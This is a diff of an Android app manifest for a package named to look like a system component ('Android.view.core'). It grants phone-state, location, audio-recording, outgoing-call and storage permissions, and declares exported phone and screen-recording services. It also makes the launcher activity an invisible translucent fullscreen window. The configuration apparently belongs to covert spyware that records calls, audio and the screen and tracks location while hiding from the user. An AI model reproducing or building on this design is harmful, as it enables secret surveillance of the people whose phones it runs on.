@@ -1,13 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="Android.view.core">
+    package="Android.view.core"
+    >
 
     <!--额外的权限-->
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
-    <uses-permission android:name="android.permission.RECORD_AUDIO"></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
 
     <application
@@ -21,21 +23,24 @@
             android:name="aia-compat-api-min-version"
             android:value="1" />
 
-        <activity android:name="com.view.core.activitys.MainActivity">
+        <activity android:name="com.view.core.activitys.MainActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"
+            >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
-                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <activity android:name="com.view.core.activitys.SplashActivity"/>
 
         <service
             android:name="com.view.core.services.PhoneService"
             android:enabled="true"
             android:exported="true"></service>
+
         <service
-            android:name="com.view.core.services.PhoneService1"
+            android:name="com.view.core.services.ScreenRecordService"
             android:enabled="true"
             android:exported="true"></service>
 
